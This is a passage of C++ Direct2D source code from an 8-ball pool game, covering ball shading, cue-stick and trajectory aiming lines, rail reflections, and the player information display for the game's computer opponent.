            gs[1].position = 0.35f; gs[1].color = Lighten(b.color);                 // transitional
            gs[2].position = 1.0f;  gs[2].color = b.color;                          // base colour

            pRT->CreateGradientStopCollection(gs, 3, &pStops);

            if (pStops)
            {
                // Place the hot-spot slightly towards top-left to look more 3-D
                D2D1_POINT_2F origin = D2D1::Point2F(b.x - BALL_RADIUS * 0.4f,
                    b.y - BALL_RADIUS * 0.4f);

                D2D1_RADIAL_GRADIENT_BRUSH_PROPERTIES props =
                    D2D1::RadialGradientBrushProperties(
                        origin,                        // gradientOrigin
                        D2D1::Point2F(0, 0),           // offset (not used here)
                        BALL_RADIUS * 1.3f,            // radiusX
                        BALL_RADIUS * 1.3f);           // radiusY

                pRT->CreateRadialGradientBrush(props, pStops, &pRad);
                SafeRelease(&pStops);
            }

            //------------------------------------------
            //  Draw the solid or striped ball itself
            //------------------------------------------
            D2D1_ELLIPSE outer = D2D1::Ellipse(
                D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

            if (pRad)  pRT->FillEllipse(&outer, pRad);

            // ----------  Stripe overlay  -------------
            if (b.type == BallType::STRIPE && pStripeBrush)
            {
                // White band
                D2D1_RECT_F stripe = D2D1::RectF(
                    b.x - BALL_RADIUS,
                    b.y - BALL_RADIUS * 0.40f,
                    b.x + BALL_RADIUS,
                    b.y + BALL_RADIUS * 0.40f);
                pRT->FillRectangle(&stripe, pStripeBrush);

                // Inner circle (give stripe area same glossy shading)
                if (pRad)
                {
                    D2D1_ELLIPSE inner = D2D1::Ellipse(
                        D2D1::Point2F(b.x, b.y),
                        BALL_RADIUS * 0.60f,
                        BALL_RADIUS * 0.60f);
                    pRT->FillEllipse(&inner, pRad);
                }
            }

            // Black border
            if (pBorderBrush)
                pRT->DrawEllipse(&outer, pBorderBrush, 1.5f);

            SafeRelease(&pRad);
        }

        SafeRelease(&pStripeBrush);
        SafeRelease(&pBorderBrush);
    }

    /*void DrawBalls(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pStripeBrush = nullptr; // For stripe pattern

        pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBrush); // Placeholder
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);

        if (!pBrush || !pStripeBrush) {
            SafeRelease(&pBrush);
            SafeRelease(&pStripeBrush);
            return;
        }


        for (size_t i = 0; i < balls.size(); ++i) {
            const Ball& b = balls[i];
            if (!b.isPocketed) {
                D2D1_ELLIPSE ellipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS, BALL_RADIUS);

                // Set main ball color
                pBrush->SetColor(b.color);
                pRT->FillEllipse(&ellipse, pBrush);

                // Draw Stripe if applicable
                if (b.type == BallType::STRIPE) {
                    // Draw a white band across the middle (simplified stripe)
                    D2D1_RECT_F stripeRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS * 0.4f, b.x + BALL_RADIUS, b.y + BALL_RADIUS * 0.4f);
                    // Need to clip this rectangle to the ellipse bounds - complex!
                    // Alternative: Draw two colored arcs leaving a white band.
                    // Simplest: Draw a white circle inside, slightly smaller.
                    D2D1_ELLIPSE innerEllipse = D2D1::Ellipse(D2D1::Point2F(b.x, b.y), BALL_RADIUS * 0.6f, BALL_RADIUS * 0.6f);
                    pRT->FillEllipse(innerEllipse, pStripeBrush); // White center part
                    pBrush->SetColor(b.color); // Set back to stripe color
                    pRT->FillEllipse(innerEllipse, pBrush); // Fill again, leaving a ring - No, this isn't right.

                    // Let's try drawing a thick white line across
                    // This doesn't look great. Just drawing solid red for stripes for now.
                }

                // Draw Number (Optional - requires more complex text layout or pre-rendered textures)
                // if (b.id != 0 && pTextFormat) {
                //     std::wstring numStr = std::to_wstring(b.id);
                //     D2D1_RECT_F textRect = D2D1::RectF(b.x - BALL_RADIUS, b.y - BALL_RADIUS, b.x + BALL_RADIUS, b.y + BALL_RADIUS);
                //     ID2D1SolidColorBrush* pNumBrush = nullptr;
                //     D2D1_COLOR_F numCol = (b.type == BallType::SOLID || b.id == 8) ? D2D1::ColorF(D2D1::ColorF::Black) : D2D1::ColorF(D2D1::ColorF::White);
                //     pRT->CreateSolidColorBrush(numCol, &pNumBrush);
                //     // Create a smaller text format...
                //     // pRT->DrawText(numStr.c_str(), numStr.length(), pSmallTextFormat, &textRect, pNumBrush);
                //     SafeRelease(&pNumBrush);
                // }
            }
        }

        SafeRelease(&pBrush);
        SafeRelease(&pStripeBrush);
    }*/


    /*void DrawAimingAids(ID2D1RenderTarget* pRT) {
        // Condition check at start (Unchanged)
        //if (currentGameState != PLAYER1_TURN && currentGameState != PLAYER2_TURN &&
            //currentGameState != BREAKING && currentGameState != AIMING)
        //{
            //return;
        //}
            // NEW Condition: Allow drawing if it's a human player's active turn/aiming/breaking,
        // OR if it's AI's turn and it's in AI_THINKING state (calculating) or BREAKING (aiming break).
        bool isHumanInteracting = (!isPlayer2AI || currentPlayer == 1) &&
            (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == BREAKING || currentGameState == AIMING);
        // AI_THINKING state is when AI calculates shot. AIMakeDecision sets cueAngle/shotPower.
        // Also include BREAKING state if it's AI's turn and isOpeningBreakShot for break aim visualization.
            // NEW Condition: AI is displaying its aim
        bool isAiVisualizingShot = (isPlayer2AI && currentPlayer == 2 &&
            currentGameState == AI_THINKING && aiIsDisplayingAim);

        if (!isHumanInteracting && !(isAiVisualizingShot || (currentGameState == AI_THINKING && aiIsDisplayingAim))) {
            return;
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall || cueBall->isPocketed) return; // Don't draw if cue ball is gone

        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        ID2D1StrokeStyle* pDashedStyle = nullptr;
        ID2D1SolidColorBrush* pCueBrush = nullptr;
        ID2D1SolidColorBrush* pReflectBrush = nullptr; // Brush for reflection line

        // Ensure render target is valid
        if (!pRT) return;

        // Create Brushes and Styles (check for failures)
        HRESULT hr;
        hr = pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
        if FAILED(hr) { SafeRelease(&pBrush); return; }
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); return; }
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); return; }
        // Create reflection brush (e.g., lighter shade or different color)
        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
        if FAILED(hr) { SafeRelease(&pBrush); SafeRelease(&pGhostBrush); SafeRelease(&pCueBrush); SafeRelease(&pReflectBrush); return; }
        // Create a Cyan brush for primary and secondary lines //orig(75.0f / 255.0f, 0.0f, 130.0f / 255.0f);indigoColor
        D2D1::ColorF cyanColor(0.0, 255.0, 255.0, 255.0f);
        ID2D1SolidColorBrush* pCyanBrush = nullptr;
        hr = pRT->CreateSolidColorBrush(cyanColor, &pCyanBrush);
        if (FAILED(hr)) {
            SafeRelease(&pCyanBrush);
            // handle error if needed
        }
        // Create a Purple brush for primary and secondary lines
        D2D1::ColorF purpleColor(255.0f, 0.0f, 255.0f, 255.0f);
        ID2D1SolidColorBrush* pPurpleBrush = nullptr;
        hr = pRT->CreateSolidColorBrush(purpleColor, &pPurpleBrush);
        if (FAILED(hr)) {
            SafeRelease(&pPurpleBrush);
            // handle error if needed
        }

        if (pFactory) {
            D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
            strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
            hr = pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
            if FAILED(hr) { pDashedStyle = nullptr; }
        }


        // --- Cue Stick Drawing (Unchanged from previous fix) ---
        const float baseStickLength = 150.0f;
        const float baseStickThickness = 4.0f;
        float stickLength = baseStickLength * 1.4f;
        float stickThickness = baseStickThickness * 1.5f;
        float stickAngle = cueAngle + PI;
        float powerOffset = 0.0f;
        //if (isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) {
            // Show power offset if human is aiming/dragging, or if AI is preparing its shot (AI_THINKING or AI Break)
        if ((isAiming && (currentGameState == AIMING || currentGameState == BREAKING)) || isAiVisualizingShot) { // Use the new condition
            powerOffset = shotPower * 5.0f;
        }
        D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
        D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
        pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);


        // --- Projection Line Calculation ---
        float cosA = cosf(cueAngle);
        float sinA = sinf(cueAngle);
        float rayLength = TABLE_WIDTH + TABLE_HEIGHT; // Ensure ray is long enough
        D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
        D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);*/

    void DrawAimingAids(ID2D1RenderTarget* pRT) {
        // Determine if aiming aids should be drawn.
        bool isHumanInteracting = (!isPlayer2AI || currentPlayer == 1) &&
            (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == BREAKING || currentGameState == AIMING ||
                currentGameState == CHOOSING_POCKET_P1 || currentGameState == CHOOSING_POCKET_P2);

        // FOOLPROOF FIX: This is the new condition to show the AI's aim.
        bool isAiVisualizingShot = (isPlayer2AI && currentPlayer == 2 && aiIsDisplayingAim);

        if (!isHumanInteracting && !isAiVisualizingShot) {
            return;
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall || cueBall->isPocketed) return;

        // --- Brush and Style Creation (No changes here) ---
        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        ID2D1StrokeStyle* pDashedStyle = nullptr;
        ID2D1SolidColorBrush* pCueBrush = nullptr;
        ID2D1SolidColorBrush* pReflectBrush = nullptr;
        ID2D1SolidColorBrush* pCyanBrush = nullptr;
        ID2D1SolidColorBrush* pPurpleBrush = nullptr;
        pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Cyan), &pCyanBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Purple), &pPurpleBrush);
        if (pFactory) {
            D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
            strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
            pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
        }
        // --- End Brush Creation ---

        float angleToDraw = visualCueAngle;
        float powerToDraw = visualShotPower;

        if (isAiVisualizingShot)      // AI uses its own instant data
        {
            angleToDraw = aiPlannedShotDetails.angle;
            powerToDraw = aiPlannedShotDetails.power;
        }

        /*// --- FOOLPROOF FIX: Use the AI's planned angle and power for drawing ---
        float angleToDraw = cueAngle;
        float powerToDraw = shotPower;

        if (isAiVisualizingShot) {
            // When the AI is showing its aim, force the drawing to use its planned shot details.
            angleToDraw = aiPlannedShotDetails.angle;
            powerToDraw = aiPlannedShotDetails.power;
        }*/
        // --- End AI Aiming Fix ---

        // --- Cue Stick Drawing ---
        const float baseStickLength = 150.0f;
        const float baseStickThickness = 4.0f;
        float stickLength = baseStickLength * 1.4f;
        float stickThickness = baseStickThickness * 1.5f;
        float stickAngle = angleToDraw + PI; // Use the angle we determined
        float powerOffset = 0.0f;
        if ((isAiming || isDraggingStick) || isAiVisualizingShot) {
            powerOffset = powerToDraw * 5.0f; // Use the power we determined
        }
        D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
        D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
        pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);

        // --- Projection Line Calculation ---
        float cosA = cosf(angleToDraw); // Use the angle we determined
        float sinA = sinf(angleToDraw);
        float rayLength = TABLE_WIDTH + TABLE_HEIGHT;
        D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
        D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);

        // Find the first ball hit by the aiming ray
        Ball* hitBall = nullptr;
        float firstHitDistSq = -1.0f;
        D2D1_POINT_2F ballCollisionPoint = { 0, 0 }; // Point on target ball circumference
        D2D1_POINT_2F ghostBallPosForHit = { 0, 0 }; // Ghost ball pos for the hit ball

        hitBall = FindFirstHitBall(rayStart, cueAngle, firstHitDistSq);
        if (hitBall) {
            // Calculate the point on the target ball's circumference
            float collisionDist = sqrtf(firstHitDistSq);
            ballCollisionPoint = D2D1::Point2F(rayStart.x + cosA * collisionDist, rayStart.y + sinA * collisionDist);
            // Calculate ghost ball position for this specific hit (used for projection consistency)
            ghostBallPosForHit = D2D1::Point2F(hitBall->x - cosA * BALL_RADIUS, hitBall->y - sinA * BALL_RADIUS); // Approx.
        }

        // Find the first rail hit by the aiming ray
        D2D1_POINT_2F railHitPoint = rayEnd; // Default to far end if no rail hit
        float minRailDistSq = rayLength * rayLength;
        int hitRailIndex = -1; // 0:Left, 1:Right, 2:Top, 3:Bottom

        // Define table edge segments for intersection checks
        D2D1_POINT_2F topLeft = D2D1::Point2F(TABLE_LEFT, TABLE_TOP);
        D2D1_POINT_2F topRight = D2D1::Point2F(TABLE_RIGHT, TABLE_TOP);
        D2D1_POINT_2F bottomLeft = D2D1::Point2F(TABLE_LEFT, TABLE_BOTTOM);
        D2D1_POINT_2F bottomRight = D2D1::Point2F(TABLE_RIGHT, TABLE_BOTTOM);

        D2D1_POINT_2F currentIntersection;

        // Check Left Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topLeft, bottomLeft, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 0; }
        }
        // Check Right Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topRight, bottomRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 1; }
        }
        // Check Top Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topLeft, topRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 2; }
        }
        // Check Bottom Rail
        if (LineSegmentIntersection(rayStart, rayEnd, bottomLeft, bottomRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 3; }
        }


        // --- Determine final aim line end point ---
        D2D1_POINT_2F finalLineEnd = railHitPoint; // Assume rail hit first
        bool aimingAtRail = true;

        if (hitBall && firstHitDistSq < minRailDistSq) {
            // Ball collision is closer than rail collision
            finalLineEnd = ballCollisionPoint; // End line at the point of contact on the ball
            aimingAtRail = false;
        }

        // --- Draw Primary Aiming Line ---
        pRT->DrawLine(rayStart, finalLineEnd, pBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

        // --- Draw Target Circle/Indicator ---
        D2D1_ELLIPSE targetCircle = D2D1::Ellipse(finalLineEnd, BALL_RADIUS / 2.0f, BALL_RADIUS / 2.0f);
        pRT->DrawEllipse(&targetCircle, pBrush, 1.0f);

        // --- Draw Projection/Reflection Lines ---
        if (!aimingAtRail && hitBall) {
            // Aiming at a ball: Draw Ghost Cue Ball and Target Ball Projection
            D2D1_ELLIPSE ghostCue = D2D1::Ellipse(ballCollisionPoint, BALL_RADIUS, BALL_RADIUS); // Ghost ball at contact point
            pRT->DrawEllipse(ghostCue, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

            // Calculate target ball projection based on impact line (cue collision point -> target center)
            float targetProjectionAngle = atan2f(hitBall->y - ballCollisionPoint.y, hitBall->x - ballCollisionPoint.x);
            // Clamp angle calculation if distance is tiny
            if (GetDistanceSq(hitBall->x, hitBall->y, ballCollisionPoint.x, ballCollisionPoint.y) < 1.0f) {
                targetProjectionAngle = cueAngle; // Fallback if overlapping
            }

            D2D1_POINT_2F targetStartPoint = D2D1::Point2F(hitBall->x, hitBall->y);
            D2D1_POINT_2F targetProjectionEnd = D2D1::Point2F(
                hitBall->x + cosf(targetProjectionAngle) * 50.0f, // Projection length 50 units
                hitBall->y + sinf(targetProjectionAngle) * 50.0f
            );
            // Draw solid line for target projection
            //pRT->DrawLine(targetStartPoint, targetProjectionEnd, pBrush, 1.0f);

        //new code start

                    // Dual trajectory with edge-aware contact simulation
            D2D1_POINT_2F dir = {
                targetProjectionEnd.x - targetStartPoint.x,
                targetProjectionEnd.y - targetStartPoint.y
            };
            float dirLen = sqrtf(dir.x * dir.x + dir.y * dir.y);
            dir.x /= dirLen;
            dir.y /= dirLen;

            D2D1_POINT_2F perp = { -dir.y, dir.x };

            // Approximate cue ball center by reversing from tip
            D2D1_POINT_2F cueBallCenterForGhostHit = { // Renamed for clarity if you use it elsewhere
                targetStartPoint.x - dir.x * BALL_RADIUS,
                targetStartPoint.y - dir.y * BALL_RADIUS
            };

            // REAL contact-ball center - use your physics object's center:
            // (replace 'objectBallPos' with whatever you actually call it)
            // (targetStartPoint is already hitBall->x, hitBall->y)
            D2D1_POINT_2F contactBallCenter = targetStartPoint; // Corrected: Use the object ball's actual center
            //D2D1_POINT_2F contactBallCenter = D2D1::Point2F(hitBall->x, hitBall->y);

           // The 'offset' calculation below uses 'cueBallCenterForGhostHit' (originally 'cueBallCenter').
           // This will result in 'offset' being 0 because 'cueBallCenterForGhostHit' is defined
           // such that (targetStartPoint - cueBallCenterForGhostHit) is parallel to 'dir',
           // and 'perp' is perpendicular to 'dir'.
           // Consider Change 2 if this 'offset' is not behaving as intended for the secondary line.
            /*float offset = ((targetStartPoint.x - cueBallCenterForGhostHit.x) * perp.x +
                (targetStartPoint.y - cueBallCenterForGhostHit.y) * perp.y);*/
                /*float offset = ((targetStartPoint.x - cueBallCenter.x) * perp.x +
                    (targetStartPoint.y - cueBallCenter.y) * perp.y);
                float absOffset = fabsf(offset);
                float side = (offset >= 0 ? 1.0f : -1.0f);*/

                // Use actual cue ball center for offset calculation if 'offset' is meant to quantify the cut
            D2D1_POINT_2F actualCueBallPhysicalCenter = D2D1::Point2F(cueBall->x, cueBall->y); // This is also rayStart

            // Offset calculation based on actual cue ball position relative to the 'dir' line through targetStartPoint
            float offset = ((targetStartPoint.x - actualCueBallPhysicalCenter.x) * perp.x +
                (targetStartPoint.y - actualCueBallPhysicalCenter.y) * perp.y);
            float absOffset = fabsf(offset);
            float side = (offset >= 0 ? 1.0f : -1.0f);


            // Actual contact point on target ball edge
            D2D1_POINT_2F contactPoint = {
            contactBallCenter.x + perp.x * BALL_RADIUS * side,
            contactBallCenter.y + perp.y * BALL_RADIUS * side
            };

            // Tangent (cut shot) path from contact point
                // Tangent (cut shot) path: from contact point to contact ball center
            D2D1_POINT_2F objectBallDir = {
                contactBallCenter.x - contactPoint.x,
                contactBallCenter.y - contactPoint.y
            };
            float oLen = sqrtf(objectBallDir.x * objectBallDir.x + objectBallDir.y * objectBallDir.y);
            if (oLen != 0.0f) {
                objectBallDir.x /= oLen;
                objectBallDir.y /= oLen;
            }

            const float PRIMARY_LEN = 150.0f; //default=150.0f
            const float SECONDARY_LEN = 150.0f; //default=150.0f
            const float STRAIGHT_EPSILON = BALL_RADIUS * 0.05f;

            D2D1_POINT_2F primaryEnd = {
                targetStartPoint.x + dir.x * PRIMARY_LEN,
                targetStartPoint.y + dir.y * PRIMARY_LEN
            };

            // Secondary line starts from the contact ball's center
            D2D1_POINT_2F secondaryStart = contactBallCenter;
            D2D1_POINT_2F secondaryEnd = {
                secondaryStart.x + objectBallDir.x * SECONDARY_LEN,
                secondaryStart.y + objectBallDir.y * SECONDARY_LEN
            };

            if (absOffset < STRAIGHT_EPSILON)  // straight shot?
            {
                // Straight: secondary behind primary
                        // secondary behind primary {pDashedStyle param at end}
                pRT->DrawLine(secondaryStart, secondaryEnd, pPurpleBrush, 2.0f);
                //pRT->DrawLine(secondaryStart, secondaryEnd, pGhostBrush, 1.0f);
                pRT->DrawLine(targetStartPoint, primaryEnd, pCyanBrush, 2.0f);
                //pRT->DrawLine(targetStartPoint, primaryEnd, pBrush, 1.0f);
            }
            else
            {
                // Cut shot: both visible
                        // both visible for cut shot
                pRT->DrawLine(secondaryStart, secondaryEnd, pPurpleBrush, 2.0f);
                //pRT->DrawLine(secondaryStart, secondaryEnd, pGhostBrush, 1.0f);
                pRT->DrawLine(targetStartPoint, primaryEnd, pCyanBrush, 2.0f);
                //pRT->DrawLine(targetStartPoint, primaryEnd, pBrush, 1.0f);
            }
            // End improved trajectory logic

        //new code end

            // -- Cue Ball Path after collision (Optional, requires physics) --
            // Very simplified: Assume cue deflects, angle depends on cut angle.
            // float cutAngle = acosf(cosf(cueAngle - targetProjectionAngle)); // Angle between paths
            // float cueDeflectionAngle = ? // Depends on cutAngle, spin, etc. Hard to predict accurately.
            // D2D1_POINT_2F cueProjectionEnd = ...
            // pRT->DrawLine(ballCollisionPoint, cueProjectionEnd, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

            // --- Accuracy Comment ---
            // Note: The visual accuracy of this projection, especially for cut shots (hitting the ball off-center)
            // or shots with spin, is limited by the simplified physics model. Real pool physics involves
            // collision-induced throw, spin transfer, and cue ball deflection not fully simulated here.
            // The ghost ball method shows the *ideal* line for a center-cue hit without spin.

        }
        else if (aimingAtRail && hitRailIndex != -1) {
            // Aiming at a rail: Draw reflection line
            float reflectAngle = cueAngle;
            // Reflect angle based on which rail was hit
            if (hitRailIndex == 0 || hitRailIndex == 1) { // Left or Right rail
                reflectAngle = PI - cueAngle; // Reflect horizontal component
            }
            else { // Top or Bottom rail
                reflectAngle = -cueAngle; // Reflect vertical component
            }
            // Normalize angle if needed (atan2 usually handles this)
            while (reflectAngle > PI) reflectAngle -= 2 * PI;
            while (reflectAngle <= -PI) reflectAngle += 2 * PI;


            float reflectionLength = 60.0f; // Length of the reflection line
            D2D1_POINT_2F reflectionEnd = D2D1::Point2F(
                finalLineEnd.x + cosf(reflectAngle) * reflectionLength,
                finalLineEnd.y + sinf(reflectAngle) * reflectionLength
            );

            // Draw the reflection line (e.g., using a different color/style)
            pRT->DrawLine(finalLineEnd, reflectionEnd, pReflectBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);
        }

        // Release resources
        SafeRelease(&pBrush);
        SafeRelease(&pGhostBrush);
        SafeRelease(&pCueBrush);
        SafeRelease(&pReflectBrush); // Release new brush
        SafeRelease(&pCyanBrush);
        SafeRelease(&pPurpleBrush);
        SafeRelease(&pDashedStyle);
    }


    void DrawUI(ID2D1RenderTarget* pRT) {
        if (!pTextFormat || !pLargeTextFormat) return;

        ID2D1SolidColorBrush* pBrush = nullptr;
        pRT->CreateSolidColorBrush(UI_TEXT_COLOR, &pBrush);
        if (!pBrush) return;

        //new code
        // --- Always draw AI's 8?Ball call arrow when it's Player?2's turn and AI has called ---
        //if (isPlayer2AI && currentPlayer == 2 && calledPocketP2 >= 0) {
            // FIX: This condition correctly shows the AI's called pocket arrow.
        if (isPlayer2AI && IsPlayerOnEightBall(2) && calledPocketP2 >= 0) {
            // pocket index that AI called
            int idx = calledPocketP2;
            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    { P.x - 15.0f, P.y - 40.0f },
                    { P.x + 15.0f, P.y - 40.0f },
                    { P.x       , P.y - 10.0f }
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink);
                SafeRelease(&geom);
                SafeRelease(&pArrow);
            }
            // draw “Choose a pocket...” prompt
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""AI has called this pocket"",
                (UINT32)wcslen(L""AI has called this pocket""),
                pTextFormat,
                &txt,
                pBrush
            );
            // note: no return here — we still draw fouls/turn text underneath
        }
        //end new code

        // --- Player Info Area (Top Left/Right) --- (Unchanged)
        float uiTop = TABLE_TOP - 80;
        float uiHeight = 60;
        float p1Left = TABLE_LEFT;
        float p1Width = 150;
        float p2Left = TABLE_RIGHT - p1Width;
        D2D1_RECT_F p1Rect = D2D1::RectF(p1Left, uiTop, p1Left + p1Width, uiTop + uiHeight);
        D2D1_RECT_F p2Rect = D2D1::RectF(p2Left, uiTop, p2Left + p1Width, uiTop + uiHeight);

        // Player 1 Info Text (Unchanged)
        std::wostringstream oss1;
        oss1 << player1Info.name.c_str() << L""\n"";
        if (player1Info.assignedType != BallType::NONE) {
            oss1 << ((player1Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
            oss1 << L"" ["" << player1Info.ballsPocketedCount << L""/7]"";
        }
        else {
            oss1 << L""(Undecided)"";
        }
        pRT->DrawText(oss1.str().c_str(), (UINT32)oss1.str().length(), pTextFormat, &p1Rect, pBrush);
        // Draw Player 1 Side Ball
        if (player1Info.assignedType != BallType::NONE)
        {
            ID2D1SolidColorBrush* pBallBrush = nullptr;
            D2D1_COLOR_F ballColor = (player1Info.assignedType == BallType::SOLID) ?
                D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
            pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
            if (pBallBrush)
            {
                D2D1_POINT_2F ballCenter = D2D1::Point2F(p1Rect.right + 10.0f, p1Rect.top + 20.0f);
                float radius = 10.0f;
                D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
                pRT->FillEllipse(&ball, pBallBrush);
                SafeRelease(&pBallBrush);
                // Draw border around the ball
                ID2D1SolidColorBrush* pBorderBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
                if (pBorderBrush)
                {
                    pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                    SafeRelease(&pBorderBrush);
                }

                // If stripes, draw a stripe band
                if (player1Info.assignedType == BallType::STRIPE)
                {
                    ID2D1SolidColorBrush* pStripeBrush = nullptr;
                    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                    if (pStripeBrush)
                    {
                        D2D1_RECT_F stripeRect = D2D1::RectF(
                            ballCenter.x - radius,
                            ballCenter.y - 3.0f,
                            ballCenter.x + radius,
                            ballCenter.y + 3.0f
                        );
                        pRT->FillRectangle(&stripeRect, pStripeBrush);
                        SafeRelease(&pStripeBrush);
                    }
                }
            }
        }


        // Player 2 Info Text (Unchanged)
        std::wostringstream oss2;
        oss2 << player2Info.name.c_str() << L""\n"";
        if (player2Info.assignedType != BallType::NONE) {
            oss2 << ((player2Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
            oss2 << L"" ["" << player2Info.ballsPocketedCount << L""/7]"";
        }
        else {
            oss2 << L""(Undecided)"";
        }
        pRT->DrawText(oss2.str().c_str(), (UINT32)oss2.str().length(), pTextFormat, &p2Rect, pBrush);
        // Draw Player 2 Side Ball
        if (player2Info.assignedType != BallType::NONE)
        {
            ID2D1SolidColorBrush* pBallBrush = nullptr;
            D2D1_COLOR_F ballColor = (player2Info.assignedType == BallType::SOLID) ?
                D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
            pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
            if (pBallBrush)
            {
                D2D1_POINT_2F ballCenter = D2D1::Point2F(p2Rect.right + 10.0f, p2Rect.top + 20.0f);
